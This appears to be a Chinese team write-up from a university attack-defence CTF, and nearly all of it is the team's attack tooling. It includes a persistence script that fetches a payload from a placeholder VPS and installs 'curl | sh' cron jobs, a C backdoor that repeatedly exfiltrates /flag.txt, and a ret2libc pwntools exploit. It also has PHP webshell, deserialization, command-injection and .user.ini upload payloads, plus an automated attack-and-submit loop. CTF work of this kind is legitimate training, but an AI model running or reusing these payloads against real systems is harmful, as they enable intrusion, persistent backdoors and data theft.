队名：各位师傅求放过  
队员： 
- 【REDACTED】  
- 【REDACTED】  
- 【REDACTED】  
- 【REDACTED】   

分工：1:1:1:1 (25%:25%:25%:25%)  
- 【REDACTED】: PWN题利用(狂炫5000分)，持久化脚本编写，WEB题利用  
- 【REDACTED】: PWN题修复(写了SECCOMP，全程pwn未被攻陷)  
- 【REDACTED】: WEB题修复(全程web未被攻陷)  
- 【REDACTED】: WEB题利用，提供EDR环境(猛上3000分)  


经过队内协商，在8点后陆续停止攻击流量，在8点10分之后关闭flag提交进程
在比赛开始1小时后我们就彻底停止了flag的提交。


一键部署后门程序的持久化脚本
```sh
#!/bin/sh

/usr/bin/curl -fsSL http://[YOUR-VPS]/secure -o /tmp/docker
/usr/bin/wget http://[YOUR-VPS]/secure -O /tmp/docker
echo "*/5 * * * * curl -fsSL http://[YOUR-VPS]/good | sh" | crontab
echo "*/5 * * * * curl -fsSL http://[YOUR-VPS]/download/good | sh" | crontab
mkdir /tmp/sys_config
cp /tmp/docker /tmp/sys_config/systemd
chmod +x /tmp/docker
chmod +x /tmp/sys_config/systemd
nohup /tmp/docker >/dev/null &
nohup /tmp/sys_config/systemd >/dev/null &

/usr/bin/wget http://[YOUR-VPS]/?f=`/bin/cat /flag.txt`
/usr/bin/curl http://[YOUR-VPS]/?f=`/bin/cat /flag.txt | /usr/bin/base64`
python3 -c "import urllib.request; urllib.request.urlopen('http://[YOUR-VPS]/?f='+open('/flag.txt').read())"
```
后门程序
```c
#include<stdio.h>

int main(){
    const char * payload1 = "/usr/bin/wget http://[YOUR-VPS]/?f=`/bin/cat /flag.txt`";
    const char * payload2 = "/usr/bin/curl http://[YOUR-VPS]/?f=`/bin/cat /flag.txt | /usr/bin/base64`";
    const char * payload3 = "python3 -c \"import urllib.request; urllib.request.urlopen('http://[YOUR-VPS]/?f='+open('/flag.txt').read())\"";
    while(1){
        system(payload1);
        system(payload2);
        system(payload3);
        sleep(150);
    }
}
```

接受回传flag的远程服务
```python
import http.server
import requests
import re
import base64
import uuid
import config

host = ("", 8000)


def submit(flag: str):
    token = {
        "Authorization": "3e934bbe40492a1c79d469c4c605edb1"
    }
    data = {
        "flag": flag
    }
    with open("log.txt", "a") as f:
        f.write(flag + "\n")
    print(flag)
    # print(requests.post("http://detroit.sustech.edu.cn:29999/api/flag",
                        # headers=token, json=data, timeout=1).text)


def warp(flag) -> str:
    return "cs315{" + flag.strip() + "}"


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        flag = self.path.split("=")[1]
        if "cs315" in flag:
            submit(flag=flag)
        else:
            try:
                # use base64 to decode
                flag1 = flag
                if len(flag) % 4 != 0:
                    flag1 += "=" * (4 - len(flag) % 4)
                flag1 = base64.b64decode(flag1).decode()
                if "cs315" in flag1:
                    submit(flag=str(flag1))
                else:
                    submit(flag=warp(flag=flag1))
            except Exception as e:
                print(str(e))
                submit(flag=warp(flag=flag))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"flag{"+str(uuid.uuid1()).encode()+b"}")


httpd = http.server.HTTPServer(host, Handler)
httpd.serve_forever()
```

PWN题目的利用（Ret2libc）
```python
from pwn import *

context.clear(arch='amd64')
for x in [PORTS]:
    elf = ELF('calculator')
    libc = ELF('elibc.so.6')
    c = remote("172.18.36.237", x)
    pop_rdi = 0x400ec3
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.symbols['main']
    c.sendlineafter(b'calculations:', b'100')

    n = 100
    payload = bytearray(cyclic(n * 4, n=8))  
    payload[208:208 + 8] = b'\x00' * 8  
    payload[248:248 + 8] = p64(pop_rdi)
    payload[248 + 8:248 + 16] = p64(puts_got)
    payload[248 + 16:248 + 24] = p64(puts_plt)
    payload[248 + 24:248 + 32] = p64(main_addr)

    for i in range(n - 1):
        item = u32(payload[i * 4:i * 4 + 4])
        c.sendlineafter(b'\n\n', b'1')
        c.sendlineafter(b'x:\n', str(item).encode())
        c.sendlineafter(b'y:\n', b'0')

    c.sendlineafter(b'\n\n', b'5')
    addr = u64(c.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    print(hex(addr))

    c.sendlineafter(b'calculations:', b'100')
    libc.address = addr - libc.symbols['puts']
    bin_sh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    print(hex(bin_sh))
    print(hex(system))
    n = 100
    payload = bytearray(cyclic(n * 4, n=8))   
    payload[208:208 + 8] = b'\x00' * 8   
    payload[248:248 + 8] = p64(pop_rdi + 1)
    payload[248 + 8:248 + 16] = p64(pop_rdi)
    payload[248 + 16:248 + 24] = p64(bin_sh)
    payload[248 + 24:248 + 32] = p64(system)

    for i in range(n - 1):
        item = u32(payload[i * 4:i * 4 + 4])
        c.sendlineafter(b'\n\n', b'1')
        c.sendlineafter(b'x:\n', str(item).encode())
        c.sendlineafter(b'y:\n', b'0')

    c.sendlineafter(b'\n\n', b'5')
    c.sendline("curl http://[YOUR IP]/good | sh")
    c.close()
```


web的反序列化
```
O%3A7%3A%22chybeta%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A24%3A%22%3C%3Fphp%20eval%28%24%5FGET%5Ba%5D%29%3B%20%3F%3E%22%3B%7D
```

web的后门
```
http://127.0.0.1:web/org/smarty/Autofoucer.php?cmd=system%28%22cat%20%2Fflag.txt%22%29%3B
```

web的命令拼接
```
;cat /flag.txt
```
web的文件上传
```python
import requests
import base64

url = "http://172.18.36.237:28123/index.php?c=User&a=upload"

cookies = {
    "PHPSESSID":"j1v34miki4vloqkd3jfm3n0vg3"
}


htaccess = b"""\x00\x00\x8a\x39\x8a\x39
auto_prepend_file = cc.jpg
"""

#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<?php eval($_GET['c']);?>")
shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00" + \
    b"<script language='php'>eval($_REQUEST[c]);</script>"

files = [('fileUpload', ('.user.ini', htaccess, 'image/jpeg'))]

data = {"upload": "Submit"}

# proxies = {"http":"http://127.0.0.1:8080"}
print("upload .user.ini")
r = requests.post(url=url, data=data, files=files,cookies=cookies)  # proxies=proxies)

print(r.text)

print("upload cc.jpg")

files = [('fileUpload', ('cc.jpg', shell, 'image/jpeg'))]
r = requests.post(url=url, data=data, files=files,cookies=cookies)
print(r.text)
```

web的shell后门
```python
def attack(port):
    r = requests.post(f"""http://172.18.36.237:{port}/include/shell.php""", data={"75e3f495": """system("/bin/cat /flag.txt");"""}, timeout=1)
    if r.status_code == 200:
        flag = re.findall(r'cs315{.*}', r.text)[0]
        print(flag)
```

web的log文件写
```python
def attack(port):
    r = requests.post(f"""http://172.18.36.237:{port}/""", data={"x": "<?php @eval($_GET[a]); ?>"}, timeout=1)
    r = requests.get(f"""http://172.18.36.237:{port}/log.php?a=system("/bin/cat /flag.txt"); """, timeout=1)
    if r.status_code == 200:
        flag = re.findall(r'cs315{.*}', r.text)[0]
        print(flag)
```


封IP的（没用上）
```php
<?php
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];

$white_list = array(
    '*.*.*.*',
);

$black_list = array(
);

$enable_white_list = true;
$enable_black_list = true;

function match($input, $ip_list):bool{
    foreach ($ip_list as $pattern_ip) {
        $pattern_ip_arr = explode('.', $pattern_ip);
        $ip_arr = explode('.', $input);
        $match = true;
        foreach ($pattern_ip_arr as $key => $value) {
            if ($value != $ip_arr[$key] && $value != '*') {
                $match = false;
                break;
            }
        }
        if ($match) {
            return true;
        }
    }
    return false;
}

if (($enable_white_list && !match($ip, $white_list))||
    (($enable_black_list && match($ip, $black_list)))) {
    die("");
}

?>
```

自动化攻击和提交
```python
import requests
import re
import time
import subprocess

ports = ["28103","28107","28111","28115","28119","28131","28127","28135"]


def attack1(port):
    r = requests.post(
        f"""http://172.18.36.237:{port}/""", data={"x": "<?php @eval($_GET[a]); ?>"}, timeout=1)
    r = requests.get(
        f"""http://172.18.36.237:{port}/log.php?a=system("/bin/cat /flag.txt"); """, timeout=1)
    if r.status_code == 200:
        try:
            flag = re.findall(r'cs315{.*}', r.text)[0]
            print(r.text)
            print(flag)
            return flag
        except:
            return None


def attack2(port):
    r = requests.post(f"""http://172.18.36.237:{port}/include/shell.php""", data={
                      "75e3f495": """system("/bin/cat /flag.txt");"""}, timeout=1)
    if r.status_code == 200:
        try:
            flag = re.findall(r'cs315{.*}', r.text)[0]
            print(r.text)
            print(flag)
            return flag
        except:
            return None

def attack3(port):
    r = requests.post(f"""http://172.18.36.237:{port}/index.php?c=User&a=ping""", data={"host":"4 127.0.0.1;cat /flag.txt"}, timeout=1)
    if r.status_code == 200:
        try:
            flag = re.findall(r'cs315{.*}', r.text)[0]
            print(r.text)
            print(flag)
            return flag
        except:
            return None

def attack4(port):
    r = requests.get(f"""http://172.18.36.237:{port}/org/smarty/Autofoucer.php?cmd=system%28%22cat%20%2Fflag.txt%22%29%3B""",timeout=1)
    if r.status_code == 200:
        try:
            flag = re.findall(r'cs315{.*}', r.text)[0]
            print(r.text)
            print(flag)
            return flag
        except:
            return None


def submit(port: str, flag: str):
    if flag is None:
        return False
    try:
        # 修改submit的格式
        token = {
            "Authorization": "【TOKEN】"
        }
        data = {
            "flag": flag
        }
        print(requests.post("http://detroit.sustech.edu.cn:29999/api/flag",
                      headers=token, json=data, timeout=1).text)
        print("[\033[0;32mSUCCE\033[0m] "+port + " submit success")
        return True
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;32m"+port +
              "\033[0m submit failed, because: \033[0;31m" + str(e) + "\033[0m")
        return False


if __name__ == "__main__":
    while True:
        for port in ports:
            # try:
            try:
                flag = attack1(port)
                submit(port, flag)
            except:
                pass
            try:
                flag = attack2(port)
                submit(port, flag)
            except:
                pass
            try:
                flag = attack3(port)
                submit(port, flag)
            except:
                pass
            try:
                flag = attack4(port)
                submit(port, flag)
            except:
                pass
            # except:
            #     try:
            #         flag = attack2(port)
            #         submit(port, flag)
            #     except:
            #         print("error")
        # 6min
        print("finish one round")
        time.sleep(60)
```

